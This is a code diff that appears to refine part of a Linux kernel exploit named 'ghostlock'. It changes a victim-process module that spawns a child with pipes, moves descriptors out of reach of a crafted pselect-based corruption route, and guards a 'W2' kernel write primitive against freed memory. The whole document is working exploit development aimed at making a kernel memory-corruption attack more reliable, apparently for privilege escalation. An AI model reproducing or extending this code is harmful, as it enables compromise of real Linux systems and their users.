@@ -166,30 +166,70 @@ namespace ghostlock::session::victim {
         park_child_process_forever();
     }
 
-    /* Move a victim pipe end above FD_SETSIZE. The select route closes every fd
-     * whose bit is set in its crafted fd_sets (the fake waiter words set many
-     * bits), so long-lived victim fds below 1024 get closed by the route; fds
-     * >= 1024 are invisible to both select() and that cleanup loop. */
-    static int32_t remap_pipe_end_high(int32_t fd) {
-        const int32_t high = fcntl(fd, F_DUPFD, 1024);
-        if (high < 0) return fd;
+    /* Move a victim pipe end above the select route's descriptor window. The
+     * route only closes/replaces fds below PSELECT_ROUTE_NFDS (the crafted
+     * fd_sets carry those bits), and select() ignores fds >= nfds. Requiring
+     * FD_SETSIZE (1024) needlessly failed when RLIMIT_NOFILE was 1024. */
+    static int32_t move_above_select_route(int32_t fd) {
+        const int32_t high = fcntl(
+            fd, F_DUPFD, static_cast<int32_t>(kernel::PSELECT_ROUTE_NFDS));
+        if (high < 0) {
+            pr_warning("victim fd relocation failed fd=%d errno=%d\n", fd, errno);
+            return -1;
+        }
         (void) close(fd);
         return high;
     }
 
     static pid_t spawn_child(VictimContext &p) {
-        std::array<int32_t, 2> p1{}, p2{}, p3{};
-        if (pipe(p1.data()) < 0 || pipe(p2.data()) < 0 || pipe(p3.data()) < 0) return -1;
-        p.task_read.reset(p1[0]);
-        p.task_write.reset(p1[1]);
+        std::array<int32_t, 2> p1{-1, -1}, p2{-1, -1}, p3{-1, -1};
+        auto close_pipes = [&]() noexcept {
+            for (std::array<int32_t, 2> *pair : {&p1, &p2, &p3}) {
+                for (int32_t &fd : *pair) {
+                    if (fd >= 0) (void) close(fd);
+                    fd = -1;
+                }
+            }
+        };
+        if (pipe(p1.data()) < 0) return -1;
+        if (pipe(p2.data()) < 0) {
+            close_pipes();
+            return -1;
+        }
+        if (pipe(p3.data()) < 0) {
+            close_pipes();
+            return -1;
+        }
         /* Only the parent-side ends need protection: the child's copies are
          * private to the child and never touched by the route. */
-        p.cmd_write.reset(remap_pipe_end_high(p2[1]));
-        p.uid_read.reset(remap_pipe_end_high(p3[0]));
+        const int32_t cmd_write = move_above_select_route(p2[1]);
+        if (cmd_write < 0) {
+            close_pipes();
+            return -1;
+        }
+        p2[1] = cmd_write;
+        const int32_t uid_read = move_above_select_route(p3[0]);
+        if (uid_read < 0) {
+            close_pipes();
+            return -1;
+        }
+        p3[0] = uid_read;
+        p.task_read.reset(p1[0]);
+        p.task_write.reset(p1[1]);
+        p.cmd_write.reset(p2[1]);
         p.cmd_read.reset(p2[0]);
+        p.uid_read.reset(p3[0]);
         p.uid_write.reset(p3[1]);
         pid_t child = fork();
-        if (child < 0) return -1;
+        if (child < 0) {
+            p.task_read.reset();
+            p.task_write.reset();
+            p.cmd_write.reset();
+            p.cmd_read.reset();
+            p.uid_read.reset();
+            p.uid_write.reset();
+            return -1;
+        }
         if (child == 0) {
             child_main(p);
             _exit(1);
@@ -225,16 +265,26 @@ namespace ghostlock::session::victim {
         auto *stage = static_cast<struct w2_stage_context *>(context);
         if (stage->pipes.child() > 0) {
             int32_t st = 0;
+            errno = 0;
             pid_t w = waitpid(stage->pipes.child(), &st, WNOHANG);
             if (w == stage->pipes.child()) {
                 pr_warning("W2 verify: victim already exited status=0x%x\n", st);
-                return 0;
+                stage->pipes.mark_child_exited();
+                return -1;
+            }
+            if (w < 0 && errno == ECHILD) {
+                pr_warning("W2 verify: victim was already reaped\n");
+                stage->pipes.mark_child_exited();
+                return -1;
             }
         }
         errno = 0;
         ssize_t cw = write(stage->pipes.cmd_write.get(), "C", 1);
         if (cw != 1) {
             pr_warning("W2 verify: cmd write ret=%zd errno=%d\n", cw, errno);
+            /* The child/task address may already be gone; a further W2 write
+             * through it would touch freed or reused kernel memory. */
+            if (errno == EBADF || errno == EPIPE || errno == ESRCH) return -1;
             return 0;
         }
 
